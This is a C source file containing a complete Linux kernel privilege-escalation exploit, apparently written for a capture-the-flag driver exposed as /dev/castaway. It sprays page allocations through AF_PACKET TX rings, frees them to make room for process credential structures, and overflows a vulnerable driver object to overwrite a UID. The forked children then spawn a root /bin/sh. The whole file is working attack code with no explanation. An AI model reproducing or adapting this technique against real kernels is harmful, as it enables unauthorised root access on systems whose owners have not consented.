#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif
 
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <string.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sched.h>
#include <linux/keyctl.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <asm/ldt.h>
#include <sys/shm.h>
#include <sys/wait.h>
#include <sys/socket.h>


#define PACKET_VERSION 10
#define PACKET_TX_RING 13
#define PGV_PAGE_NUM 1000

#define CRED_SPRAY_NUM 1066
#define VULN_OBJ_NUM 400

int fd;
char buf[1];
int cmd_pipe_req[2], cmd_pipe_reply[2], check_root_pipe[2];
char sh[] = "/bin/sh";
char* shell[] = { sh, NULL };
struct timespec timer = {
	.tv_sec = 2353567,
	.tv_nsec = 0,
};

struct node {
	size_t idx;
	size_t size;
	char* ptr;
};

void add()
{
	ioctl(fd, 0xCAFEBABE, NULL);
}

void edit(size_t idx, size_t size, char* ptr)
{
	struct node n = { .idx = idx, .size = size, .ptr = ptr };
	ioctl(fd, 0xF00DBABE, &n);
}

__attribute__((naked)) int __clone(int flags, int (*fn)(void*))
{
	__asm__ volatile(
	"mov r15, rsi;"
	"xor rsi, rsi;"
	"xor rdx, rdx;"
	"xor r8, r8;"
	"xor r9, r9;"
	"xor r10, r10;"
	"mov rax, 56;"
	"syscall;"
	"cmp rax, 0;"
	"je CHECK;"
	"ret;"
	"CHECK:"
	"jmp r15;"
	);
}

int wait_for_root(void *args)
{
	__asm__ volatile(
	"lea rax, [check_root_pipe];"
	"mov rdi, qword ptr [rax];"
	"mov rsi, buf;"
	"mov rdx, 1;"
	"xor rax, rax;"
	"syscall;"
	"mov rax, 102;"
	"syscall;"
	"cmp rax, 0;"
	"jne FAILED;"
	"lea rdi, [sh];"
	"lea rsi, [shell];"
	"xor rdx, rdx;"
	"mov rax, 59;"
	"syscall;"
	"FAILED:"
	"lea rdi, [timer];"
	"xor rsi, rsi;"
	"mov rax, 35;"
	"syscall;"
	);
}

struct tpacket_req {
    unsigned int tp_block_size;
    unsigned int tp_block_nr;
    unsigned int tp_frame_size;
    unsigned int tp_frame_nr;
};

/* each allocation is (size * nr) bytes, aligned to PAGE_SIZE */
struct pgv_page_request {
    int idx;
    int cmd;
    unsigned int size;
    unsigned int nr;
};

enum tpacket_versions {
    TPACKET_V1,
    TPACKET_V2,
    TPACKET_V3,
};

enum {
    CMD_ALLOC_PAGE,
    CMD_FREE_PAGE,
    CMD_EXIT,
};

/* create an isolate namespace for pgv */
void unshare_setup(void)
{
    char edit[0x100];
    int tmp_fd;

    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);

    tmp_fd = open("/proc/self/setgroups", O_WRONLY);
    write(tmp_fd, "deny", strlen("deny"));
    close(tmp_fd);

    tmp_fd = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", getuid());
    write(tmp_fd, edit, strlen(edit));
    close(tmp_fd);

    tmp_fd = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", getgid());
    write(tmp_fd, edit, strlen(edit));
    close(tmp_fd);
}

/* create a socket and alloc pages, return the socket fd */
int create_socket_and_alloc_pages(unsigned int size, unsigned int nr)
{
    struct tpacket_req req;
    int socket_fd, version;
    int ret;

    socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);
    if (socket_fd < 0) {
        printf("[x] failed at socket(AF_PACKET, SOCK_RAW, PF_PACKET)\n");
        ret = socket_fd;
        goto err_out;
    }

    version = TPACKET_V1;
    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION, 
                     &version, sizeof(version));
    if (ret < 0) {
        printf("[x] failed at setsockopt(PACKET_VERSION)\n");
        goto err_setsockopt;
    }

    memset(&req, 0, sizeof(req));
    req.tp_block_size = size;
    req.tp_block_nr = nr;
    req.tp_frame_size = 0x1000;
    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;

    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &req, sizeof(req));
    if (ret < 0) {
        printf("[x] failed at setsockopt(PACKET_TX_RING)\n");
        goto err_setsockopt;
    }

    return socket_fd;

err_setsockopt:
    close(socket_fd);
err_out:
    return ret;
}

/* parent call it to send command of allocation to child */
int alloc_page(int idx, unsigned int size, unsigned int nr)
{
    struct pgv_page_request req = {
        .idx = idx,
        .cmd = CMD_ALLOC_PAGE,
        .size = size,
        .nr = nr,
    };
    int ret;

    write(cmd_pipe_req[1], &req, sizeof(struct pgv_page_request));
    read(cmd_pipe_reply[0], &ret, sizeof(ret));

    return ret;
}

/* parent call it to send command of freeing to child */
int free_page(int idx)
{
    struct pgv_page_request req = {
        .idx = idx,
        .cmd = CMD_FREE_PAGE,
    };
    int ret;

    write(cmd_pipe_req[1], &req, sizeof(req));
    read(cmd_pipe_reply[0], &ret, sizeof(ret));

    return ret;
}

/* child thread's handler for commands from the pipe */
void spray_cmd_handler(void)
{
    struct pgv_page_request req;
    int socket_fd[PGV_PAGE_NUM];
    int ret;

    /* create an isolate namespace*/
    unshare_setup();

    /* handler request */
    do {
        read(cmd_pipe_req[0], &req, sizeof(req));

        if (req.cmd == CMD_ALLOC_PAGE) {
            ret = create_socket_and_alloc_pages(req.size, req.nr);
            socket_fd[req.idx] = ret;
        } else if (req.cmd == CMD_FREE_PAGE) {
            ret = close(socket_fd[req.idx]);
        } else {
            printf("[x] invalid request: %d\n", req.cmd);
        }

        write(cmd_pipe_reply[1], &ret, sizeof(ret));
    } while (req.cmd != CMD_EXIT);
}

void err_exit(char *msg)
{
    printf("\033[31m\033[1m[x] Error at: \033[0m%s\n", msg);
    sleep(5);
    exit(EXIT_FAILURE);
}

void info(char *msg)
{
    printf("\033[32m\033[1m[+] %s\n\033[0m", msg);
}

void hexx(char *msg, size_t value)
{
    printf("\033[32m\033[1m[+] %s: %#lx\n\033[0m", msg, value);
}

void binary_dump(char *desc, void *addr, int len) {
    uint64_t *buf64 = (uint64_t *) addr;
    uint8_t *buf8 = (uint8_t *) addr;
    if (desc != NULL) {
        printf("\033[33m[*] %s:\n\033[0m", desc);
    }
    for (int i = 0; i < len / 8; i += 4) {
        printf("  %04x", i * 8);
        for (int j = 0; j < 4; j++) {
            i + j < len / 8 ? printf(" 0x%016lx", buf64[i + j]) : printf("                   ");
        }
        printf("   ");
        for (int j = 0; j < 32 && j + i * 8 < len; j++) {
            printf("%c", isprint(buf8[i * 8 + j]) ? buf8[i * 8 + j] : '.');
        }
        puts("");
    }
}

void bind_core(int core)
{
    cpu_set_t cpu_set;

    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

    printf("\033[34m\033[1m[*] Process binded to core \033[0m%d\n", core);
}


int main(int argc, char** argv, char** env)
{
	char buffer[0x1000];
	bind_core(0);
	fd = open("/dev/castaway", O_RDWR);
	if (fd < 0) err_exit("open /dev/castaway");

	pipe(cmd_pipe_req);
	pipe(cmd_pipe_reply);
	pipe(check_root_pipe);
	
	if (!fork())
	{
		spray_cmd_handler();
		exit(0);
	}

	info("STEP.I	Spray pgv page-0");
	for (int i = 0; i < PGV_PAGE_NUM; i++)
		if (alloc_page(i, 0x1000, 1) < 0)
			err_exit("alloc_page");

	info("STEP.II	Free pages for cred struct");	
	for (int i = 1; i < PGV_PAGE_NUM; i+=2)
		if (free_page(i) < 0)
			err_exit("free_page for cred");

	info("STEP.III	Spray cred struct");
	for (int i = 0; i < CRED_SPRAY_NUM; i++)
		if (__clone(CLONE_FILES|CLONE_FS|CLONE_VM|CLONE_SIGHAND, wait_for_root) < 0)
			err_exit("__clone");

	info("STEP.IV	Free pages for vuln object");
	for (int i = 0; i < PGV_PAGE_NUM; i+=2)
		if (free_page(i) < 0)
			err_exit("free_page for vuln object");
		
	info("STEP.V	Spray vuln object to overwrite UID");
	memset(buffer, '\0', sizeof(buffer));
	*(uint32_t*)&buffer[512-6] = 1;
	for (int i = 0; i < VULN_OBJ_NUM; i++)
	{
		add();
		edit(i, 512, buffer);
	}
	
	info("CHECK ROOT");
	write(check_root_pipe[1], buffer, CRED_SPRAY_NUM);	
	sleep(23535670);

        return 0;
}
